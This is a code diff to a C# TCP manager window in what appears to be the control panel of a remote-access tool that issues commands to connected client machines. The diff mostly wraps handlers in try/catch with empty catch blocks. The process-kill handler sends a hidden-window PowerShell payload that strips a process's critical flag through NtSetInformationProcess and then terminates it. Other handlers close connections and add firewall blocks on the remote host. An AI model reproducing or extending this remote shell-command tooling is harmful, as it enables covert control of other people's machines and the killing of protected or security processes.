@@ -70,6 +70,7 @@ public partial class TcpManagerWindow : ThemedWindow
                 _entries.Clear();
                 foreach (var e in data.Entries)
                     _entries.Add(new TcpEntryVM(e.Pid, e.ProcessName, e.LocalAddr, e.RemoteAddr, e.State));
+                TxtCount.Text = $"({_entries.Count})";
                 TxtStatus.Text = string.Format(Lang.Get("TCP_UPDATED"), _entries.Count, DateTime.Now.ToString("HH:mm:ss"));
             });
         }
@@ -92,110 +93,130 @@ public partial class TcpManagerWindow : ThemedWindow
         catch { }
     }
 
-    private async void Refresh_Click(object s, RoutedEventArgs e) => await Refresh();
+    private async void Refresh_Click(object s, RoutedEventArgs e) { try { await Refresh(); } catch { } }
 
     private async void CloseConn_Click(object s, RoutedEventArgs e)
     {
-        var sel = GridTcp.SelectedItems.Cast<TcpEntryVM>().ToList();
-        if (sel.Count == 0) return;
-        string confirmMsg = sel.Count == 1
-            ? string.Format(Lang.Get("TCP_CLOSE_CONFIRM_1"), sel[0].RemoteAddr, sel[0].ProcessName)
-            : string.Format(Lang.Get("TCP_CLOSE_CONFIRM_N"), sel.Count);
-        if (MessageBox.Show(confirmMsg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
-        foreach (var row in sel)
+        try
         {
-            var data = JsonConvert.SerializeObject(new TcpCloseData { LocalAddr = row.LocalAddr, RemoteAddr = row.RemoteAddr });
-            await _server.SendToClient(_clientId, new Packet { Type = PacketType.TcpClose, Data = data });
+            var sel = GridTcp.SelectedItems.Cast<TcpEntryVM>().ToList();
+            if (sel.Count == 0) return;
+            string confirmMsg = sel.Count == 1
+                ? string.Format(Lang.Get("TCP_CLOSE_CONFIRM_1"), sel[0].RemoteAddr, sel[0].ProcessName)
+                : string.Format(Lang.Get("TCP_CLOSE_CONFIRM_N"), sel.Count);
+            if (MessageBox.Show(confirmMsg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
+            foreach (var row in sel)
+            {
+                var data = JsonConvert.SerializeObject(new TcpCloseData { LocalAddr = row.LocalAddr, RemoteAddr = row.RemoteAddr });
+                await _server.SendToClient(_clientId, new Packet { Type = PacketType.TcpClose, Data = data });
+            }
+            ServerWindow.ReportGlobalActivity("Close TCP", sel.Count == 1 ? sel[0].RemoteAddr : $"{sel.Count} conns", "complete");
+            ServerWindow.LogGlobal($"[TCP] Closed {(sel.Count == 1 ? $"TCP connection {sel[0].RemoteAddr} ({sel[0].ProcessName})" : $"{sel.Count} TCP connections")} on client {_clientId}.");
+            await Task.Delay(300);
+            await Refresh();
         }
-        ServerWindow.ReportGlobalActivity("Close TCP", sel.Count == 1 ? sel[0].RemoteAddr : $"{sel.Count} conns", "complete");
-        ServerWindow.LogGlobal($"[TCP] Closed {(sel.Count == 1 ? $"TCP connection {sel[0].RemoteAddr} ({sel[0].ProcessName})" : $"{sel.Count} TCP connections")} on client {_clientId}.");
-        await Task.Delay(300);
-        await Refresh();
+        catch { }
     }
 
     private async void KillProc_Click(object s, RoutedEventArgs e)
     {
-        var sel = GridTcp.SelectedItems.Cast<TcpEntryVM>().Where(r => r.Pid > 0).ToList();
-        if (sel.Count == 0) return;
-        string confirmMsg = sel.Count == 1
-            ? string.Format(Lang.Get("PM_KILL_1"), sel[0].ProcessName, sel[0].Pid)
-            : string.Format(Lang.Get("PM_KILL_N"), sel.Count);
-        if (MessageBox.Show(confirmMsg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
-        foreach (var row in sel)
+        try
         {
-            var cmd = $"powershell -NoP -NonI -W H -Command \"" +
-                      $"Add-Type -TypeDefinition @'`n" +
-                      $"using System.Runtime.InteropServices;`n" +
-                      $"public class PK {{`n" +
-                      $"[DllImport(\\\"ntdll.dll\\\")] public static extern int NtSetInformationProcess(System.IntPtr h,int c,ref uint v,int s);`n" +
-                      $"[DllImport(\\\"kernel32.dll\\\",SetLastError=true)] public static extern System.IntPtr OpenProcess(uint a,bool i,int p);`n" +
-                      $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool TerminateProcess(System.IntPtr h,uint c);`n" +
-                      $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool CloseHandle(System.IntPtr h);`n" +
-                      $"}}`n" +
-                      $"'@ -ErrorAction SilentlyContinue;" +
-                      $"$h=[PK]::OpenProcess(0x1FFFFF,$false,{row.Pid});" +
-                      $"if($h -ne [IntPtr]::Zero){{$z=[uint32]0;[PK]::NtSetInformationProcess($h,0x1D,[ref]$z,4)|Out-Null;" +
-                      $"[PK]::TerminateProcess($h,0)|Out-Null;[PK]::CloseHandle($h)|Out-Null}}\"";
-            await _server.SendToClient(_clientId, new Packet { Type = PacketType.AutoTaskShell, Data = cmd });
+            var sel = GridTcp.SelectedItems.Cast<TcpEntryVM>().Where(r => r.Pid > 0).ToList();
+            if (sel.Count == 0) return;
+            string confirmMsg = sel.Count == 1
+                ? string.Format(Lang.Get("PM_KILL_1"), sel[0].ProcessName, sel[0].Pid)
+                : string.Format(Lang.Get("PM_KILL_N"), sel.Count);
+            if (MessageBox.Show(confirmMsg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
+            foreach (var row in sel)
+            {
+                var cmd = $"powershell -NoP -NonI -W H -Command \"" +
+                          $"Add-Type -TypeDefinition @'`n" +
+                          $"using System.Runtime.InteropServices;`n" +
+                          $"public class PK {{`n" +
+                          $"[DllImport(\\\"ntdll.dll\\\")] public static extern int NtSetInformationProcess(System.IntPtr h,int c,ref uint v,int s);`n" +
+                          $"[DllImport(\\\"kernel32.dll\\\",SetLastError=true)] public static extern System.IntPtr OpenProcess(uint a,bool i,int p);`n" +
+                          $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool TerminateProcess(System.IntPtr h,uint c);`n" +
+                          $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool CloseHandle(System.IntPtr h);`n" +
+                          $"}}`n" +
+                          $"'@ -ErrorAction SilentlyContinue;" +
+                          $"$h=[PK]::OpenProcess(0x1FFFFF,$false,{row.Pid});" +
+                          $"if($h -ne [IntPtr]::Zero){{$z=[uint32]0;[PK]::NtSetInformationProcess($h,0x1D,[ref]$z,4)|Out-Null;" +
+                          $"[PK]::TerminateProcess($h,0)|Out-Null;[PK]::CloseHandle($h)|Out-Null}}\"";
+                await _server.SendToClient(_clientId, new Packet { Type = PacketType.AutoTaskShell, Data = cmd });
+            }
+            TxtStatus.Text = sel.Count == 1
+                ? string.Format(Lang.Get("TCP_KILL_SENT"), sel[0].Pid, sel[0].ProcessName)
+                : string.Format(Lang.Get("TCP_KILL_SENT_N"), sel.Count);
+            ServerWindow.ReportGlobalActivity("Kill process", sel.Count == 1 ? sel[0].ProcessName : $"{sel.Count} processes", "complete");
+            ServerWindow.LogGlobal($"[TCP] Killed process {(sel.Count == 1 ? $"'{sel[0].ProcessName}' (PID {sel[0].Pid})" : $"{sel.Count} processes")} via TCP manager on client {_clientId}.");
+            await Task.Delay(600);
+            await Refresh();
         }
-        TxtStatus.Text = sel.Count == 1
-            ? string.Format(Lang.Get("TCP_KILL_SENT"), sel[0].Pid, sel[0].ProcessName)
-            : string.Format(Lang.Get("TCP_KILL_SENT_N"), sel.Count);
-        ServerWindow.ReportGlobalActivity("Kill process", sel.Count == 1 ? sel[0].ProcessName : $"{sel.Count} processes", "complete");
-        ServerWindow.LogGlobal($"[TCP] Killed process {(sel.Count == 1 ? $"'{sel[0].ProcessName}' (PID {sel[0].Pid})" : $"{sel.Count} processes")} via TCP manager on client {_clientId}.");
-        await Task.Delay(600);
-        await Refresh();
+        catch { }
     }
 
     private async void BlockIp_Click(object s, RoutedEventArgs e)
     {
-        var selected = GridTcp.SelectedItem as TcpEntryVM;
-        string? defIp = selected?.RemoteAddr?.Split(':').FirstOrDefault();
-        var ip = SimpleInput("Block remote IP in firewall (inbound + outbound):", defIp ?? "");
-        if (string.IsNullOrWhiteSpace(ip)) return;
-        await _server.SendToClient(_clientId, new Packet
+        try
         {
-            Type = PacketType.TcpFirewallBlock,
-            Data = JsonConvert.SerializeObject(new TcpFirewallBlockData { ProcessName = "", Port = 0, RemoteIp = ip, Direction = "both" })
-        });
-        TxtStatus.Text = string.Format(Lang.Get("TCP_BLOCK_IP"), ip);
-        ServerWindow.ReportGlobalActivity("Firewall block IP", ip, "complete");
-        ServerWindow.LogGlobal($"[TCP] Blocked remote IP {ip} in firewall on client {_clientId}.");
+            var selected = GridTcp.SelectedItem as TcpEntryVM;
+            string? defIp = selected?.RemoteAddr?.Split(':').FirstOrDefault();
+            var ip = SimpleInput("Block remote IP in firewall (inbound + outbound):", defIp ?? "");
+            if (string.IsNullOrWhiteSpace(ip)) return;
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.TcpFirewallBlock,
+                Data = JsonConvert.SerializeObject(new TcpFirewallBlockData { ProcessName = "", Port = 0, RemoteIp = ip, Direction = "both" })
+            });
+            TxtStatus.Text = string.Format(Lang.Get("TCP_BLOCK_IP"), ip);
+            ServerWindow.ReportGlobalActivity("Firewall block IP", ip, "complete");
+            ServerWindow.LogGlobal($"[TCP] Blocked remote IP {ip} in firewall on client {_clientId}.");
+        }
+        catch { }
     }
 
     private async void BlockProcess_Click(object s, RoutedEventArgs e)
     {
-        var selected = GridTcp.SelectedItem as TcpEntryVM;
-        var name = SimpleInput("Block process (full path or name):", selected?.ProcessName ?? "");
-        if (string.IsNullOrWhiteSpace(name)) return;
-        await _server.SendToClient(_clientId, new Packet
+        try
         {
-            Type = PacketType.TcpFirewallBlock,
-            Data = JsonConvert.SerializeObject(new TcpFirewallBlockData { ProcessName = name, Port = 0, Direction = "both" })
-        });
-        TxtStatus.Text = string.Format(Lang.Get("TCP_BLOCK_PROC"), name);
-        ServerWindow.ReportGlobalActivity("Firewall block proc", name, "complete");
-        ServerWindow.LogGlobal($"[TCP] Blocked process '{name}' in firewall on client {_clientId}.");
+            var selected = GridTcp.SelectedItem as TcpEntryVM;
+            var name = SimpleInput("Block process (full path or name):", selected?.ProcessName ?? "");
+            if (string.IsNullOrWhiteSpace(name)) return;
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.TcpFirewallBlock,
+                Data = JsonConvert.SerializeObject(new TcpFirewallBlockData { ProcessName = name, Port = 0, Direction = "both" })
+            });
+            TxtStatus.Text = string.Format(Lang.Get("TCP_BLOCK_PROC"), name);
+            ServerWindow.ReportGlobalActivity("Firewall block proc", name, "complete");
+            ServerWindow.LogGlobal($"[TCP] Blocked process '{name}' in firewall on client {_clientId}.");
+        }
+        catch { }
     }
 
     private async void BlockPort_Click(object s, RoutedEventArgs e)
     {
-        var selected = GridTcp.SelectedItem as TcpEntryVM;
-        string? defPort = null;
-        if (selected?.LocalAddr?.Contains(':') == true &&
-            int.TryParse(selected.LocalAddr.Split(':').Last(), out _))
-            defPort = selected.LocalAddr.Split(':').Last();
-
-        var portStr = SimpleInput("Block port (TCP):", defPort ?? "");
-        if (!int.TryParse(portStr, out int port) || port <= 0) return;
-        await _server.SendToClient(_clientId, new Packet
+        try
         {
-            Type = PacketType.TcpFirewallBlock,
-            Data = JsonConvert.SerializeObject(new TcpFirewallBlockData { ProcessName = "", Port = port, Direction = "both" })
-        });
-        TxtStatus.Text = string.Format(Lang.Get("TCP_BLOCK_PORT"), port);
-        ServerWindow.ReportGlobalActivity("Firewall block port", port.ToString(), "complete");
-        ServerWindow.LogGlobal($"[TCP] Blocked TCP port {port} in firewall on client {_clientId}.");
+            var selected = GridTcp.SelectedItem as TcpEntryVM;
+            string? defPort = null;
+            if (selected?.LocalAddr?.Contains(':') == true &&
+                int.TryParse(selected.LocalAddr.Split(':').Last(), out _))
+                defPort = selected.LocalAddr.Split(':').Last();
+
+            var portStr = SimpleInput("Block port (TCP):", defPort ?? "");
+            if (!int.TryParse(portStr, out int port) || port <= 0) return;
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.TcpFirewallBlock,
+                Data = JsonConvert.SerializeObject(new TcpFirewallBlockData { ProcessName = "", Port = port, Direction = "both" })
+            });
+            TxtStatus.Text = string.Format(Lang.Get("TCP_BLOCK_PORT"), port);
+            ServerWindow.ReportGlobalActivity("Firewall block port", port.ToString(), "complete");
+            ServerWindow.LogGlobal($"[TCP] Blocked TCP port {port} in firewall on client {_clientId}.");
+        }
+        catch { }
     }
 
     private string? SimpleInput(string prompt, string? def = null)
